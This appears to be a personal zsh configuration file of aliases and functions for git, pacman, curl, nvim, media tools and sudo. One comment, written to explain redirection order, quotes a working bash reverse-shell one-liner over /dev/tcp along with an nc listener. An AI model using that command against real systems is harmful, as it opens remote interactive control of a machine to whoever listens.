#-------------------------------------------------------------
# 

function _cmd_available
{
  command -v "$1" >/dev/null
}

function zsh::utils::check_can_reload_or_exit
{
  if [[ -n "$(jobs)" ]]; then
    local prefix="Error"
    [[ -n "${1:-}" ]] && prefix="Cannot $1"

    print -P "${prefix}: %j job(s) in background"

    return 1 # cannot reload nor exit!
  else
    return 0 # all good, do whatever you want!
  fi
}

function zsh::safe_reload
{
  zsh::utils::check_can_reload_or_exit "reload" || return

  [[ -n "$ORIGINAL_PATH" ]] && export PATH="$ORIGINAL_PATH"
  exec zsh
}

function zsh::safe_exit
{
  zsh::utils::check_can_reload_or_exit "quit" || return

  exit
}

function zsh::nuke_exit
{
  # Ensures the shell cannot save history before quitting!
  kill -9 $$
}

alias zshrc=zsh::safe_reload
alias ":r"=zsh::safe_reload
alias ":q"=zsh::safe_exit
alias ":qqq"=zsh::nuke_exit

# global redirection aliases

alias -g NOOUT=">/dev/null"
alias -g NOERR="2>/dev/null"
alias -g ERR2OUT="2>&1"
alias -g NOOUTPUT="NOOUT NOERR"
# interesting link on redirections order: https://wiki.bash-hackers.org/howto/redirection_tutorial
# alias -g NOOUTPUT="3>/dev/null 1>&3 2>&3"
# ==> creates fd 3 to /dev/null then redirects fd 1,2 to THE VALUE OF fd 3 (an fd of /dev/null)
#
# And another one: https://hypothetical.me/post/reverse-shell-in-bash/
# so a bash reverse shell looks like (listen with `nc -lp 4444`):
# (in bash): bash -i 3>/dev/tcp/127.0.0.1/4444 >&3 2>&3 0<&3
# ==> creates fd 3 to tcp connection then redirects fd 0,1,2 to THE VALUE of fd 3 (which is a
#     bidirectional tcp conn to localhost:4444)
#     Note: not sure why but `0<&3` and `0>&3` works the same. we assign values of fd to fd, but
#     not write-only/read-only ? So it's not possible to redirect stdin for reading or writing to
#     different files?

# Shorters

alias g=git
alias gh=hub
alias m=make
alias dk=docker
alias dkc=docker-compose
alias cr=crystal
alias pac=pacman
alias tre=tree
alias py=python
alias ipy="ipython --no-confirm-exit"
alias com=command
alias j=jobs

# Always use tmux in 256 colors and force UTF-8
alias tmux="tmux -2 -u"
alias tx="tmux"

alias hc=herbstclient

# Big-one letter aliases

alias A=ack
alias H=head
alias T=tail
alias L=less
alias V=vim
alias G="command grep --color=auto -n"

# Add verbosity to common commands

alias rm="rm -vI"
alias cp="cp -vi"
alias mv="mv -vi"
alias ln="ln -iv"
alias mkdir="mkdir -v"

# ls

alias ls="ls --color=auto --group-directories-first"
alias ll="ls -lh"
alias la="ll -a"
alias l="la"
alias l1="ls -1"

# curl

alias dl_file="curl -L -O"
alias curl_json='curl -H "Accept:application/json" -H "Content-Type:application/json"'

function curl_auth
{
  local token="$1"; shift
  if [[ -z "$token" ]]; then
    echo 2>/dev/null "Missing <token>"
    return 1
  fi

  curl -H "Authorization: Bearer $token" "$@"
}

function curl_auth_json
{
  local token="$1"; shift
  if [[ -z "$token" ]]; then
    echo 2>/dev/null "Missing <token>"
    return 1
  fi

  curl_auth "$token" -H "Accept:application/json" -H "Content-Type:application/json" "$@"
}

# misc

alias todo='rg -i "todo|fixme" --colors=match:fg:yellow --colors=match:style:bold'

# Search the given bin name in PATH (ignores aliases/functions)
# -p : always search in PATH
# -s : show the realpath in addition to the path in PATH
alias which::in-path='which -ps'

# Always expose a known TERM (not the 256color version) to the server I'm connecting to.
alias ssh='TERM=xterm ssh'

function cheatsh
{
  curl cht.sh/$1
}

# ps
# -f : full listing (show process name & args)
# --forest : Show a processes hierarchy
alias pss="ps -f --forest"

# Colorful diffs (https://www.colordiff.org/)
if _cmd_available colordiff; then
  alias diff="colordiff"
fi

# ping
if _cmd_available prettyping; then
  alias pg="prettyping google.fr"
else
  alias pg="ping google.fr"
fi

# DNS lookup (`dig` is deprecated on archlinux)
if _cmd_available drill; then
  alias dig=drill
fi

# mkdir

alias mkd="mkdir -p"

# Creates 1 or more directories, then cd into the first one
function mkcd
{
  mkd "$@"
  cd "$1"
}

# tree

alias tree="tree -C --dirsfirst -F"

# cd

alias ..="cd ..;"
alias ...="cd ../..;"
alias ....="cd ../../..;"

alias cdt="cd /tmp;"
alias cdl="cd -;"

# pacman

alias pac::list_useless_deps="pacman -Qtdq"

function pac::show_useless_deps
{
  for package in $(pac::list_useless_deps); do
    echo "Package: $package"
    pacman -Qi $package | grep 'Description'
    echo
  done
}

alias pac::remove_useless_deps="command sudo pacman -Rsv \$(pac::list_useless_deps)"

# yay

alias yay="yay --builddir ~/.long_term_cache/yay_build_dir"

# git

alias gnp="git --no-pager"
alias git::status_in_all_repos="find -name .git -prune -print -execdir git status \;"
alias git_watch="watch --color -- git --no-pager -c color.ui=always"
alias cdgit='git rev-parse && cd "$(git rev-parse --show-toplevel)"'

# Clone git repository and cd to it
#
# Handles the following invocations:
# - gclonecd <url>
# - gclonecd <url>.git
# - gclonecd <url>      destination_dir
# - gclonecd <url>.git  destination_dir
function gclonecd
{
  local clone_dir
  if [[ -n "$2" ]] && ! [[ "$2" =~ "-" ]]; then
    clone_dir="$2"
  else
    # basename of url, removing '.git' if present
    clone_dir=$(basename "$1" .git)
  fi
  git clone "$@" && cd "$clone_dir"
}

# Open git viewer in nvim
# (https://github.com/junegunn/gv.vim)
alias gv="e +GV"

# sudo

# Makes sudo work with alias (e.g. 'sudo pac' => 'sudo pacman')
# Note: the trailing space is important (see the man for the zsh alias builtin)
alias sudo="sudo "

# Without args: close the current sudo session if any.
# With args: run args _then_ close current sudo session.
function nosudo
{
  if [[ $# == 0 ]]; then
    sudo -k # Close the current sudo session if any
  else
    sudo "$@"
    sudo -k # Close the current sudo session
  fi
}
compdef _sudo nosudo
alias nosudo="nosudo " # allow alias expansion after 'nosudo'


# nvim

# launch editor (- let's try that!)
alias e="nvim"
alias v="nvim -R"
# e: edit | v: view

alias clean_swaps='rm ~/.nvim/swap_undo/swapfiles/.* ~/.nvim/swap_undo/swapfiles/*'

# ncdu
alias ncdu='ncdu --color dark'

# ssh
alias ssh-password-only='ssh -o PubkeyAuthentication=no'

# nix
alias nix-prefetch-url-tarball='nix-prefetch-url --unpack'

# python
alias venv::load_helpers="source ~/.dot/shell/venv_helpers.sh"

# Media commands

# youtube-dl

alias ytdl='youtube-dl'
alias ytdl-m4a='ytdl --extract-audio -f m4a --ignore-errors'
alias ytdl-m4a-nolist='ytdl-m4a --no-playlist'

# mpv

alias mpv-audio='mpv --no-video'
alias mpv-audio-loop='mpv-audio --loop-playlist'

# ffmpeg

alias ffmpeg='ffmpeg -hide_banner'
alias ffprobe='ffprobe -hide_banner'


# clock in terminal

alias clock='tty-clock -sc -C6 -d 0.5'
alias c=clock

# text translation (with https://github.com/soimort/translate-shell)

# translation
alias fr:en='trans fr:en -b'
alias en:fr='trans en:fr -b'
function fr:en:fr
{
  local fr_en="$(fr:en $*)" && echo "en: $fr_en" && en:fr "$fr_en"
}
function en:fr:en
{
  local en_fr="$(en:fr $*)" && echo "fr: $en_fr" && fr:en "$en_fr"
}

# definition
alias en:def='trans en: -d'
alias fr:def='trans fr: -d'

# misc

alias makeawesome='make CMAKE_ARGS="-DLUA_LIBRARY=/usr/lib/liblua.so"'

# Hacks

# 'pezop' is a firefox profile, where the browser language is in french, to
# bypass language limitations on some sites :)
alias ff_streaming="firefox -P pezop www.diagrim.com &!"


# Fast config edit

alias ezshrc="e ~/.dot/zsh/zshrc"
alias enviminit="e ~/.dot/nvim/init.vim"
alias envimmappings="e ~/.dot/nvim/mappings.vim"
alias cddot="cd ~/.dot"
alias cdzsh="cd ~/.dot/zsh"
alias cdnvim="cd ~/.dot/nvim"
alias cdbin="cd ~/.dot/bin"

